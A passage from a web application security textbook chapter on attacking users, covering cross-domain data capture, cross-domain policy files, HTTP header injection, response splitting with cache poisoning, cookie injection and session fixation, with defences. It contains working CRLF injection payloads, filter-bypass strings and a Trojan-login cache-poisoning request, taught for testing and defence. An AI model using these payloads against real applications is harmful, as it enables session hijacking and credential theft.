In a different example, the value of the token may be assigned within a function:
function setStatus(status)
{
 ...
 nonce = ‚Äò222230313740821‚Äô;
 ...
}
In this situation, the following attack would work:
<script src=‚Äùhttps://wahh-network.com/status‚Äù>
</script>
<script>
 setStatus(‚Äòa‚Äô);
 alert(nonce);
</script>
Various other techniques may apply in different situations with variable 
assignments. In some cases the attacker may need to implement a partial replica 
of the target application‚Äôs client-side logic to be able to include some of its scripts 
and capture the values of sensitive items.
c13.indd 522 c13.indd 522 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 523
 Chapter 13 n Attacking Users: Other Techniques 523
E4X
In the recent past, E4X has been a fast-evolving area, with browser behavior 
being frequently updated in response to exploitable conditions that have been 
identifi ed in numerous real-world applications.
E4X is an extension to ECMAScript languages (including JavaScript) that adds 
native support for the XML language. At the present time, it is implemented in 
current versions of the Firefox browser. Although it has since been fi xed, a classic 
example of cross-domain data capture can be found in Firefox‚Äôs handling of E4X.
As well as allowing direct usage of XML syntax within JavaScript, E4X allows 
nested calls to JavaScript from within XML:
var foo=<bar>{prompt(‚ÄòPlease enter the value of bar.‚Äô)}</bar>;
These features of E4X have two signifi cant consequences for cross-domain 
data-capture attacks:
n A piece of well-formed XML markup is treated as a value that is not 
assigned to any variable.
n Text nested in a {...} block is executed as JavaScript to initialize the 
relevant part of the XML data.
Much well-formed HTML is also well-formed XML, meaning that it can be 
consumed as E4X. Furthermore, much HTML includes script code in a {...}
block that contains sensitive data. For example:
<html>
<head>
<script>
...
function setNonce()
{
 nonce = ‚Äò222230313740821‚Äô;
}
...
</script>
</head>
<body>
...
</body>
</html>
In earlier versions of Firefox, it was possible to perform a cross-domain script 
include of a full HTML response like this and have some of the embedded 
JavaScript execute within the attacker‚Äôs domain.
c13.indd 523 c13.indd 523 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 524
524 Chapter 13 n Attacking Users: Other Techniques
Furthermore, in a technique similar to the CSS injection attack described 
previously, it was sometimes possible to inject text at appropriate points within 
a target application‚Äôs HTML response to wrap an arbitrary {...} block around 
sensitive data contained within that response. The whole response could then 
be included cross-domain as a script to capture the wrapped data.
Neither of the attacks just described works on current browsers. As this process continues, and browser support for novel syntactic constructs is further 
extended, it is likely that new kinds of cross-domain data capture will become 
possible, targeting applications that were not vulnerable to these attacks before 
the new browser features were introduced.
Preventing JavaScript Hijacking
Several preconditions must be in place before a JavaScript hijacking attack can 
be performed. To prevent such attacks, it is necessary to violate at least one 
of these preconditions. To provide defense-in-depth, it is recommended that 
multiple precautions be implemented jointly:
n As for requests that perform sensitive actions, the application should 
use standard anti-CSRF defenses to prevent cross-domain requests from 
returning any responses containing sensitive data.
n When an application dynamically executes JavaScript code from its own 
domain, it is not restricted to using <script> tags to include the script. 
Because the request is on-site, client-side code can use XMLHttpRequest to 
retrieve the raw response and perform additional processing on it before it 
is executed as script. This means that the application can insert invalid or 
problematic JavaScript at the start of the response, which the client application removes before it is processed. For example, the following code causes 
an infi nite loop when executed using a script include but can be stripped 
before execution when the script is accessed using XMLHttpRequest:
for(;;);
n Because the application can use XMLHttpRequest to retrieve dynamic script 
code, it can use POST requests to do so. If the application accepts only POST
requests for potentially vulnerable script code, it prevents third-party 
sites from including them using <script> tags.
The Same-Origin Policy Revisited
This chapter and the preceding one have described numerous examples of 
how the same-origin policy is applied to HTML and JavaScript, and ways 
in which it can be circumvented via application bugs and browser quirks. 
c13.indd 524 c13.indd 524 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 525
 Chapter 13 n Attacking Users: Other Techniques 525
To understand more fully the consequences of the same-origin policy for 
web application security, this section examines some further contexts in 
which the policy applies and how certain cross-domain attacks can arise in 
those contexts.
The Same-Origin Policy and Browser Extensions
The browser extension technologies that are widely deployed all implement 
segregation between domains in a way that is derived from the same basic 
principles as the main browser same-origin policy. However, some unique 
features exist in each case that can enable cross-domain attacks in some 
situations.
The Same-Origin Policy and Flash
Flash objects have their origin determined by the domain of the URL from which 
the object is loaded, not the URL of the HTML page that loads the object. As 
with the same-origin policy in the browser, segregation is based on protocol, 
hostname, and port number by default.
In addition to full two-way interaction with the same origin, Flash objects 
can initiate cross-domain requests via the browser, using the URLRequest
API. This gives more control over requests than is possible with pure browser 
techniques, including the ability to specify an arbitrary Content-Type header 
and to send arbitrary content in the body of POST requests. Cookies from the 
browser‚Äôs cookie jar are applied to these requests, but the responses from 
cross-origin requests cannot by default be read by the Flash object that initiated them.
Flash includes a facility for domains to grant permission for Flash objects from 
other domains to perform full two-way interaction with them. This is usually 
done by publishing a policy fi le at the URL /crossdomain.xml on the domain 
that is granting permission. When a Flash object attempts to make a two-way 
cross-domain request, the Flash browser extension retrieves the policy fi le 
from the domain being requested and permits the request only if the requested 
domain grants access to the requesting domain.
Here‚Äôs an example of the Flash policy fi le published by www.adobe.com:
<?xml version=‚Äù1.0‚Äù?>
<cross-domain-policy>
 <site-control permitted-cross-domain-policies=‚Äùby-content-type‚Äù/>
 <allow-access-from domain=‚Äù*.macromedia.com‚Äù />
 <allow-access-from domain=‚Äù*.adobe.com‚Äù />
 <allow-access-from domain=‚Äù*.photoshop.com‚Äù />
 <allow-access-from domain=‚Äù*.acrobat.com‚Äù />
</cross-domain-policy>
c13.indd 525 c13.indd 525 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 526
526 Chapter 13 n Attacking Users: Other Techniques
HACK STEPS
You should always check for the /crossdomain.xml fi le on any web application you are testing. Even if the application itself does not use Flash, if permission is granted to another domain, Flash objects issued by that domain are 
permitted to interact with the domain that publishes the policy.
n If the application allows unrestricted access (by specifying <allowaccess-from domain=‚Äù*‚Äù />), any other site can perform two-way 
interaction, riding on the sessions of application users. This would allow 
all data to be retrieved, and any user actions to be performed, by any 
other domain.
n If the application allows access to subdomains or other domains used by 
the same organization, two-way interaction is, of course, possible from 
those domains. This means that vulnerabilities such as XSS on those 
domains may be exploitable to compromise the domain that grants permission. Furthermore, if an attacker can purchase Flash-based advertising on any allowed domain, the Flash objects he deploys can be used to 
compromise the domain that grants permission.
n Some policy fi les disclose intranet hostnames or other sensitive information that may be of use to an attacker.
A further point of note is that a Flash object may specify a URL on the target 
server from which the policy fi le should be downloaded. If a top-level policy 
fi le is not present in the default location, the Flash browser tries to download a 
policy from the specifi ed URL. To be processed, the response to this URL must 
contain a validly formatted policy fi le and must specify an XML or text-based 
MIME type in the Content-Type header. Currently most domains on the web do 
not publish a Flash policy fi le at /crossdomain.xml, perhaps on the assumption 
that the default behavior with no policy is to disallow any cross-domain access. 
However, this overlooks the possibility of third-party Flash objects specifying 
a custom URL from which to download a policy. If an application contains any 
functionality that an attacker could leverage to place an arbitrary XML fi le into 
a URL on the application‚Äôs domain, it may be vulnerable to this attack.
The Same-Origin Policy and Silverlight
The same-origin policy for Silverlight is largely based on the policy that is 
implemented by Flash. Silverlight objects have their origin determined by the 
domain of the URL from which the object is loaded, not the URL of the HTML 
page that loads the object.
c13.indd 526 c13.indd 526 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 527
 Chapter 13 n Attacking Users: Other Techniques 527
One important difference between Silverlight and Flash is that Silverlight does 
not segregate origins based on protocol or port, so objects loaded via HTTP can 
interact with HTTPS URLs on the same domain.
Silverlight uses its own cross-domain policy fi le, located at /clientaccesspolicy.xml. Here‚Äôs an example of the Silverlight policy fi le published by www.
microsoft.com:
<?xml version=‚Äù1.0‚Äù encoding=‚Äùutf-8‚Äù?>
<access-policy>
 <cross-domain-access>
 <policy>
 <allow-from >
 <domain uri=‚Äùhttp://www.microsoft.com‚Äù/>
 <domain uri=‚Äùhttp://i.microsoft.com‚Äù/>
 <domain uri=‚Äùhttp://i2.microsoft.com‚Äù/>
 <domain uri=‚Äùhttp://i3.microsoft.com‚Äù/>
 <domain uri=‚Äùhttp://i4.microsoft.com‚Äù/>
 <domain uri=‚Äùhttp://img.microsoft.com‚Äù/>
 </allow-from>
 <grant-to>
 <resource path=‚Äù/‚Äù include-subpaths=‚Äùtrue‚Äù/>
 </grant-to>
 </policy>
 </cross-domain-access>
</access-policy>
The same considerations as already discussed for the Flash cross-domain 
policy fi le apply to Silverlight, with the exception that Silverlight does not allow 
an object to specify a nonstandard URL for the policy fi le.
If the Silverlight policy fi le is not present on a server, the Silverlight browser 
extension attempts to load a valid Flash policy fi le from the default location. If 
the fi le is present, the extension processes that instead.
The Same-Origin Policy and Java
Java implements segregation between origins in a way that is largely based on 
the browser‚Äôs same-origin policy. As with other browser extensions, Java applets 
have their origin determined by the domain of the URL from which the applet 
is loaded, not the URL of the HTML page that loads the object.
One important difference with the Java same-origin policy is that other 
domains that share the IP address of the originating domain are considered 
to be same-origin under some circumstances. This can lead to limited crossdomain interaction in some shared hosting situations.
Java currently has no provision for a domain to publish a policy allowing 
interaction from other domains.
c13.indd 527 c13.indd 527 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 528
528 Chapter 13 n Attacking Users: Other Techniques
The Same-Origin Policy and HTML5
As originally conceived, XMLHttpRequest allows requests to be issued only to 
the same origin as the invoking page. With HTML5, this technology is being 
modifi ed to allow two-way interaction with other domains, provided that the 
domains being accessed give permission to do so.
Permission for cross-domain interaction is implemented using a range of new 
HTTP headers. When a script attempts to make a cross-domain request using 
XMLHttpRequest, the way this is processed depends on the details of the request:
n For ‚Äúnormal‚Äù requests, the kind that can be generated cross-domain using 
existing HTML constructs, the browser issues the request and inspects 
the resulting response headers to determine whether the invoking script 
should be allowed to access the response from the request.
n Other requests that cannot be generated using existing HTML, such as 
those using a nonstandard HTTP method or Content-Type, or that add 
custom HTTP headers, are handled differently. The browser fi rst makes an 
OPTIONS request to the target URL and then inspects the response headers 
to determine whether the request being attempted should be permitted.
In both cases, the browser adds an Origin header to indicate the domain from 
which the cross-domain request is being attempted:
Origin: http://wahh-app.com
To identify domains that may perform two-way interaction, the server‚Äôs 
response includes the Access-Control-Allow-Origin header, which may include 
a comma-separated list of accepted domains and wildcards:
Access-Control-Allow-Origin: *
In the second case, where cross-domain requests are prevalidated using an 
OPTIONS request, headers like the following may be used to indicate the details 
of the request that is to be attempted:
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-PINGOTHER
In response to the OPTIONS request, the server may use headers like the following to specify the types of cross-domain requests that are allowed:
Access-Control-Allow-Origin: http://wahh-app.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER
Access-Control-Max-Age: 1728000
c13.indd 528 c13.indd 528 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 529
 Chapter 13 n Attacking Users: Other Techniques 529
HACK STEPS
 1. To test an application‚Äôs handling of cross-domain requests using 
XMLHttpRequest, you should try adding an Origin header specifying a 
different domain, and examine any Access-Control headers that are 
returned. The security implications of allowing two-way access from any 
domain, or from specified other domains, are the same as those described 
for the Flash cross-domain policy.
 2. If any cross-domain access is supported, you should also use OPTIONS
requests to understand exactly what headers and other request details 
are permitted.
In addition to the possibility of allowing two-way interaction from external 
domains, the new features in XMLHttpRequest may lead to new kinds of attacks 
exploiting particular features of web applications, or new attacks in general.
As described in Chapter 12, some applications use XMLHttpRequest to make 
asynchronous requests for fi les that are specifi ed within a URL parameter, or 
after the fragment identifi er. The retrieved fi le is dynamically loaded into a <div>
on the current page. Since cross-domain requests were previously not possible 
using XMLHttpRequest, it was not necessary to validate that the requested item 
was on the application‚Äôs own domain. With the new version of XMLHttpRequest,
an attacker may be able to specify a URL on a domain he controls, thereby 
performing client-side remote fi le inclusion attacks against application users.
More generally, the new features of XMLHttpRequest provide new ways for a 
malicious or compromised website to deliver attacks via the browsers of visiting 
users, even where cross-domain access is denied. Cross-domain port scanning 
has been demonstrated, using XMLHttpRequest to make attempted requests 
for arbitrary hosts and ports, and observing timing differences in responses 
to infer whether the requested port is open, closed, or fi ltered. Furthermore, 
XMLHttpRequest may be used to deliver distributed denial-of-service attacks 
at a much faster rate than is possible using older methods of generating crossdomain requests. If cross-domain access is denied by the targeted application, 
it is necessary to increment a value in a URL parameter to ensure that each 
request is for a different URL and therefore is actually issued by the browser.
Crossing Domains with Proxy Service Applications
Some publicly available web applications effectively function as proxy services, 
allowing content to be retrieved from a different domain but served to the 
c13.indd 529 c13.indd 529 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 530
530 Chapter 13 n Attacking Users: Other Techniques
user from within the proxying web application. An example of this is Google 
Translate (GT), which requests a specifi ed external URL and returns its contents, 
as shown in Figure 13-2. (Although the translation engine may modify text 
within the retrieved response, the underlying HTML markup and any script 
code are unmodifi ed).
Figure 13-2: Google Translate can be used to request an external URL, and return its 
contents, with text in the response translated into a specified language
Where this gets interesting is if two different external domains are both 
accessed via the GT application. When this happens, as far as the browser is 
concerned, the content from each external domain now resides within the GT 
domain, since this is the domain from which it was retrieved. Since the two 
sets of content reside on the same domain, two-way interaction between them 
is possible if this is also carried out via the GT domain.
Of course, if a user is logged in to an external application and then accesses 
the application via GT, her browser correctly treats GT as a different domain. 
Therefore, the user‚Äôs cookies for the external application are not sent in the 
requests via GT, nor is any other interaction possible. Hence, a malicious website 
cannot easily leverage GT to compromise users‚Äô sessions on other applications.
However, the behavior of proxy services such as GT can enable one website to perform two-way interaction with the public, unauthenticated areas 
of an application on a different domain. One example of this attack is Jikto, a 
c13.indd 530 c13.indd 530 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 531
 Chapter 13 n Attacking Users: Other Techniques 531
proof-of-concept worm that can spread between web applications by fi nding 
and exploiting persistent XSS vulnerabilities in them. In essence, Jikto‚Äôs code 
works in the following way:
n When it fi rst runs, the script checks whether it is running in the GT domain. 
If not, it reloads the current URL via the GT domain, effectively to transfer 
itself into that domain.
n The script requests content from an external domain via GT. Since the 
script itself is running in the GT domain, it can perform two-way interaction with public content on any other domain via GT.
n The script implements a basic web scanner in JavaScript to probe the 
external domain for persistent XSS fl aws. Such vulnerabilities may arise 
within publicly accessible functions such as message boards.
n When a suitable vulnerability is identifi ed, the script exploits this to upload 
a copy of itself into the external domain.
n When another user visits the compromised external domain, the script is 
executed, and the process repeats itself.
The Jikto worm seeks to exploit XSS fl aws to self-propagate. However, the 
basic attack technique of merging domains via proxy services does not depend 
on any vulnerability in the individual external applications that are targeted, 
and cannot realistically be defended against. Nevertheless, it is of interest as an 
attack technique in its own right. It is also a useful topic to test your understanding of how the same-origin policy applies in unusual situations.
Other Client-Side Injection Attacks
Many of the attacks we have examined so far involve leveraging some application function to inject crafted content into application responses. The prime 
example of this is XSS attacks. We have also seen the technique used to capture 
data cross-domain via injected HTML and CSS. This section examines a range 
of other attacks involving injection into client-side contexts.
HTTP Header Injection
HTTP header injection vulnerabilities arise when user-controllable data is 
inserted in an unsafe manner into an HTTP header returned by the application. If an attacker can inject newline characters into the header he controls, he 
can insert additional HTTP headers into the response and can write arbitrary 
content into the body of the response.
This vulnerability arises most commonly in relation to the Location and 
Set-Cookie headers, but it may conceivably occur for any HTTP header. You 
saw previously how an application may take user-supplied input and insert it 
c13.indd 531 c13.indd 531 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 532
532 Chapter 13 n Attacking Users: Other Techniques
into the Location header of a 3xx response. In a similar way, some applications 
take user-supplied input and insert it into the value of a cookie. For example:
GET /settings/12/Default.aspx?Language=English HTTP/1.1
Host: mdsec.net
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
...
In either of these cases, it may be possible for an attacker to construct a crafted 
request using the carriage-return (0x0d) and/or line-feed (0x0a) characters to 
inject a newline into the header he controls and therefore insert further data 
on the following line:
GET /settings/12/Default.aspx?Language=English%0d%0aFoo:+bar HTTP/1.1
Host: mdsec.net
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Foo: bar
...
Exploiting Header Injection Vulnerabilities
Potential header injection vulnerabilities can be detected in a similar way to 
XSS vulnerabilities, since you are looking for cases where user-controllable 
input reappears anywhere within the HTTP headers returned by the application. Hence, in the course of probing the application for XSS vulnerabilities, you 
should also identify any locations where the application may be vulnerable to 
header injection.
HACK STEPS
 1. For each potentially vulnerable instance in which user-controllable input 
is copied into an HTTP header, verify whether the application accepts data 
containing URL-encoded carriage-return (%0d) and line-feed (%0a) characters, and whether these are returned unsanitized in its response.
 2. Note that you are looking for the actual newline characters themselves to 
appear in the server‚Äôs response, not their URL-encoded equivalents. If you 
view the response in an intercepting proxy, you should see an additional 
line in the HTTP headers if the attack was successful.
 3. If only one of the two newline characters is returned in the server‚Äôs 
responses, it may still be possible to craft a working exploit, depending on 
the context.
c13.indd 532 c13.indd 532 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 533
 Chapter 13 n Attacking Users: Other Techniques 533
 4. If you find that the application is blocking or sanitizing newline characters, attempt the following bypasses:
foo%00%0d%0abar
foo%250d%250abar
foo%%0d0d%%0a0abar
WARNING Issues such as these are sometimes missed through overreliance 
on HTML source code and/or browser plug-ins for information, which do not 
show the response headers. Ensure that you are reading the HTTP response 
headers using an intercepting proxy tool.
If it is possible to inject arbitrary headers and message body content into the 
response, this behavior can be used to attack other users of the application in 
various ways.
TRY IT!
http://mdsec.net/settings/12/
http://mdsec.net/settings/31/
Injecting Cookies
A URL can be constructed that sets arbitrary cookies within the browser of any 
user who requests it:
GET /settings/12/Default.aspx?Language=English%0d%0aSetCookie:+SessId%3d120a12f98e8; HTTP/1.1
Host: mdsec.net
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Set-Cookie: SessId=120a12f98e8;
...
If suitably confi gured, these cookies may persist across different browser 
sessions. Target users can be induced to access the malicious URL via the same 
delivery mechanisms that were described for refl ected XSS vulnerabilities 
(e-mail, third-party website, and so on).
Delivering Other Attacks
Because HTTP header injection enables an attacker to control the entire body 
of a response, it can be used as a delivery mechanism for practically any attack 
against other users, including virtual website defacement, script injection, arbitrary redirection, attacks against ActiveX controls, and so on.
c13.indd 533 c13.indd 533 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 534
534 Chapter 13 n Attacking Users: Other Techniques
HTTP Response Splitting
This attack technique seeks to poison a proxy server‚Äôs cache with malicious 
content to compromise other users who access the application via the proxy. For 
example, if all users on a corporate network access an application via a caching proxy, the attacker can target them by injecting malicious content into the 
proxy‚Äôs cache, which is displayed to any users who request the affected page.
An attacker can exploit a header injection vulnerability to deliver a response 
splitting attack by following these steps:
 1. The attacker chooses a page of the application that he wants to poison 
within the proxy cache. For example, he might replace the page at /admin/
with a Trojan login form that submits the user‚Äôs credentials to the attacker‚Äôs 
server.
 2. The attacker locates a header injection vulnerability and formulates a 
request that injects an entire HTTP body into the response, plus a second 
set of response headers and a second response body. The second response 
body contains the HTML source code for the attacker‚Äôs Trojan login form. 
The effect is that the server‚Äôs response looks exactly like two separate 
HTTP responses chained together. This is where the attack technique gets 
its name, because the attacker has effectively ‚Äúsplit‚Äù the server‚Äôs response 
into two separate responses. For example:
GET /settings/12/Default.aspx?Language=English%0d%0aContent-Length:+22
%0d%0a%0d%0a<html>%0d%0afoo%0d%0a</html>%0d%0aHTTP/1.1+200+OK%0d%0a
Content-Length:+2307%0d%0a%0d%0a<html>%0d%0a<head>%0d%0a<title>
Administrator+login</title>0d%0a[...long URL...] HTTP/1.1
Host: mdsec.net
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Content-Length: 22
<html>
foo
</html>
HTTP/1.1 200 OK
Content-Length: 2307
<html>
<head>
<title>Administrator login</title>
...
 3. The attacker opens a TCP connection to the proxy server and sends his 
crafted request, followed immediately by a request for the page to be 
poisoned. Pipelining requests in this way is legal in the HTTP protocol:
c13.indd 534 c13.indd 534 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 535
 Chapter 13 n Attacking Users: Other Techniques 535
GET http://mdsec.net/settings/12/Default.aspx?Language=English%0d%0a
Content-Length:+22%0d%0a%0d%0a<html>%0d%0afoo%0d%0a</html>%0d%0aHTTP/
1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a<html>%0d%0a<head>%0d%0a
<title>Administrator+login</title>0d%0a[...long URL...] HTTP/1.1
Host: mdsec.net
Proxy-Connection: Keep-alive
GET http://mdsec.net/admin/ HTTP/1.1
Host: mdsec.net
Proxy-Connection: Close
 4. The proxy server opens a TCP connection to the application and sends 
the two requests pipelined in the same way.
 5. The application responds to the fi rst request with the attacker‚Äôs injected 
HTTP content, which looks exactly like two separate HTTP responses.
 6. The proxy server receives these two apparent responses and interprets the 
second as being the response to the attacker‚Äôs second pipelined request, 
which was for the URL http://mdsec.net/admin/. The proxy caches this 
second response as the contents of this URL. (If the proxy has already stored 
a cached copy of the page, the attacker can cause it to rerequest the URL 
and update its cache with the new version by inserting an appropriate 
If-Modified-Since header into his second request and a Last-Modified
header into the injected response.)
 7. The application issues its actual response to the attacker‚Äôs second request, 
containing the authentic contents of the URL http://mdsec.net/admin/.
The proxy server does not recognize this as being a response to a request 
that it actually issued and therefore discards it.
 8. A user accesses http://mdsec.net/admin/ via the proxy server and receives 
the content of this URL that was stored in the proxy‚Äôs cache. This content 
is in fact the attacker‚Äôs Trojan login form, so the user‚Äôs credentials are 
compromised.
The steps involved in this attack are illustrated in Figure 13-3.
Figure 13-3: The steps involved in an HTTP response splitting attack that poisons a 
proxy server cache
GET/home.php?uid=123
%0d%0aContent-Length...
GET/admin
HTTP/1.1 OK
HTTP/1.1 OK
HTTP/1.1 OK
Request 2
Request 1 causes split
response
cached
ignored Response to request 2
Response to request 1
c13.indd 535 c13.indd 535 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 536
536 Chapter 13 n Attacking Users: Other Techniques
Preventing Header Injection Vulnerabilities
The most effective way to prevent HTTP header injection vulnerabilities is to 
not insert user-controllable input into the HTTP headers that the application 
returns. As you saw with arbitrary redirection vulnerabilities, safer alternatives 
to this behavior usually are available.
If it is considered unavoidable to insert user-controllable data into HTTP 
headers, the application should employ a twofold defense-in-depth approach 
to prevent any vulnerabilities from arising:
n Input validation‚ÄîThe application should perform context-dependent 
validation of the data being inserted in as strict a manner as possible. 
For example, if a cookie value is being set based on user input, it may be 
appropriate to restrict this to alphabetical characters only and a maximum 
length of 6 bytes.
n Output validation‚ÄîEvery piece of data being inserted into headers should 
be fi ltered to detect potentially malicious characters. In practice, any character with an ASCII code below 0x20 should be regarded as suspicious, 
and the request should be rejected.
Applications can prevent any remaining header injection vulnerabilities from 
being used to poison proxy server caches by using HTTPS for all application 
content, provided that the application does not employ a caching reverse-proxy 
server behind its SSL terminator.
Cookie Injection
In cookie injection attacks, the attacker leverages some feature of an application‚Äôs functionality, or browser behavior, to set or modify a cookie within the 
browser of a victim user.
An attacker may be able to deliver a cookie injection attack in various ways:
n Some applications contain functionality that takes a name and value in 
request parameters and sets these within a cookie in the response. A 
common example where this occurs is in functions for persisting user 
preferences.
n As already described, if an HTTP header injection vulnerability exists, 
this can be exploited to inject arbitrary Set-Cookie headers.
n XSS vulnerabilities in related domains can be leveraged to set a cookie on 
a targeted domain. Any subdomains of the targeted domain itself, and 
of its parent domains and their subdomains, can all be used in this way.
n An active man-in-the-middle attack (for example, against users on a public 
wireless network) can be used to set cookies for arbitrary domains, even 
c13.indd 536 c13.indd 536 8/19/2011 12:14:00 PM 8/19/2011 12:14:00 PM
Stuttard c13.indd V4 - 08/17/2011 Page 537
 Chapter 13 n Attacking Users: Other Techniques 537
if the targeted application uses only HTTPS and its cookies are fl agged as 
secure. This kind of attack is described in more detail later in this chapter.
If an attacker can set an arbitrary cookie, this can be leveraged in various 
ways to compromise the targeted user:
n Depending on the application, setting a specifi c cookie may interfere 
with the application‚Äôs logic to the user‚Äôs disadvantage (for example, 
UseHttps=false).
n Since cookies usually are set only by the application itself, they may be 
trusted by client-side code. This code may process cookie values in ways 
that are dangerous for attacker-controllable data, leading to DOM-based 
XSS or JavaScript injection.
n Instead of tying anti-CSRF tokens to a user‚Äôs session, some applications 
work by placing the token into both a cookie and a request parameter and 
then comparing these values to prevent CSRF attacks. If the attacker controls 
both the cookie and the parameter value, this defense can be bypassed.
n As was described earlier in this chapter, some same-user persistent XSS 
can be exploited via a CSRF attack against the login function to log the user 
in to the attacker‚Äôs account and therefore access the XSS payload. If the 
login page is robustly protected against CSRF, this attack fails. However, 
if the attacker can set an arbitrary cookie in the user‚Äôs browser, he can 
perform the same attack by passing his own session token directly to the 
user, bypassing the need for a CSRF attack against the login function.
n Setting arbitrary cookies can allow session fi xation vulnerabilities to be 
exploited, as described in the next section.
Session Fixation
Session fi xation vulnerabilities typically arise when an application creates an 
anonymous session for each user when she fi rst accesses the application. If the 
application contains a login function, this anonymous session is created prior 
to login and then is upgraded to an authenticated session after the user logs in. 
The same token that initially confers no special access later allows privileged 
access within the security context of the authenticated user.
In a standard session hijacking attack, the attacker must use some means to 
capture the session token of an application user. In a session fi xation attack, on 
the other hand, the attacker fi rst obtains an anonymous token directly from 
the application and then uses some means to fi x this token within a victim‚Äôs 
browser. After the user has logged in, the attacker can use the token to hijack 
the user‚Äôs session.
Figure 13-4 shows the steps involved in a successful session fi xation attack.
c13.indd 537 c13.indd 537 8/19/2011 12:14:01 PM 8/19/2011 12:14:01 PM
Stuttard c13.indd V4 - 08/17/2011 Page 538
538 Chapter 13 n Attacking Users: Other Techniques
Figure 13-4: The steps involved in a session fixation attack
Application
2. Attacker feeds the session token to the user
User Attacker
3. User logs in using the token
received from the attacker
1. Attacker requests /login.php
and is issued with a session token
4. Attacker hijacks user‚Äôs session
using the same token as the user
The key stage in this attack is, of course, the point at which the attacker feeds 
to the victim the session token he has acquired, thereby causing the victim‚Äôs 
browser to use it. The ways in which this can be done depend on the mechanism 
used to transmit session tokens:
n If HTTP cookies are used, the attacker can try to use one of the cookie 
injection techniques, as described in the preceding section.
n If session tokens are transmitted within a URL parameter, the attacker can 
simply feed the victim the same URL that the application issued to him:
https://wahh-app.com/login.php?SessId=12d1a1f856ef224ab424c2454208
n Several application servers accept use of their session tokens within the 
URL, delimited by a semicolon. In some applications this is done by default, 
and in others, the application tolerates explicit use in this manner even if 
the servers don‚Äôt behave in this way by default:
http://wahh-app.com/store/product.do;jsessionid=739105723F7AEE6ABC2
13F812C184204.ASTPESD2
n If the application uses hidden fi elds in HTML forms to transmit session 
tokens, the attacker may be able to use a CSRF attack to introduce his 
token into the user‚Äôs browser.
Session fi xation vulnerabilities can also exist in applications that do not 
contain login functionality. For example, an application may allow anonymous 
c13.indd 538 c13.indd 538 8/19/2011 12:14:01 PM 8/19/2011 12:14:01 PM
Stuttard c13.indd V4 - 08/17/2011 Page 539
 Chapter 13 n Attacking Users: Other Techniques 539
users to browse a catalog of products, place items into a shopping cart, check 
out by submitting personal data and payment details, and then review all this 
information on a Confi rm Order page. In this situation, an attacker may fi x an 
anonymous session token with a victim‚Äôs browser, wait for that user to place 
an order and submit sensitive information, and then access the Confi rm Order 
page using the token to capture the user‚Äôs details.
Some web applications and web servers accept arbitrary tokens submitted 
by users, even if these were not previously issued by the server itself. When 
an unrecognized token is received, the server simply creates a new session 
for it and handles it exactly as if it were a new token generated by the server. 
Microsoft IIS and Allaire ColdFusion servers have been vulnerable to this 
weakness in the past.
When an application or server behaves in this way, attacks based on session fi xation are made considerably easier because the attacker does not need 
to take any steps to ensure that the tokens fi xed in target users‚Äô browsers are 
currently valid. The attacker can simply choose an arbitrary token and distribute it as widely as possible (for example, by e-mailing a URL containing 
the token to individual users, mailing lists, and so on). Then the attacker can 
periodically poll a protected page within the application (such as My Details) 
to detect when a victim has used the token to log in. Even if a targeted user 
does not follow the URL for several months, a determined attacker may still 
be able hijack her session.
Finding and Exploiting Session Fixation Vulnerabilities
If the application supports authentication, you should review how it handles session 
tokens in relation to the login. The application may be vulnerable in two ways:
n The application issues an anonymous session token to each unauthenticated user. When the user logs in, no new token is issued. Instead, her 
existing session is upgraded to an authenticated session. This behavior 
is common when the application uses the application server‚Äôs default 
session-handling mechanism.
n The application does not issue tokens to anonymous users, and a token 
is issued only following a successful login. However, if a user accesses 
the login function using an authenticated token and logs in using different credentials, no new token is issued. Instead, the user associated 
with the previously authenticated session is changed to the identity of 
the second user.
In both of these cases, an attacker can obtain a valid session token (either by 
simply requesting the login page or by performing a login with his own credentials) and feed this to a target user. When that user logs in using the token, 
the attacker can hijack the user‚Äôs session.
c13.indd 539 c13.indd 539 8/19/2011 12:14:01 PM 8/19/2011 12:14:01 PM
Stuttard c13.indd V4 - 08/17/2011 Page 540
540 Chapter 13 n Attacking Users: Other Techniques
HACK STEPS
 1. Obtain a valid token by whatever means the application enables you to 
obtain one.
 2. Access the login form, and perform a login using this token.
 3. If the login is successful and the application does not issue a new token, 
it is vulnerable to session fixation.
If the application does not support authentication but does allow users to submit 
and then review sensitive information, you should verify whether the same session 
token is used before and after the initial submission of user-specifi c information. If 
it is, an attacker can obtain a token and feed it to a target user. When the user submits sensitive details, the attacker can use the token to view the user‚Äôs information.
HACK STEPS
 1. Obtain a session token as a completely anonymous user, and then walk 
through the process of submitting sensitive data, up until any page at 
which the sensitive data is displayed back.
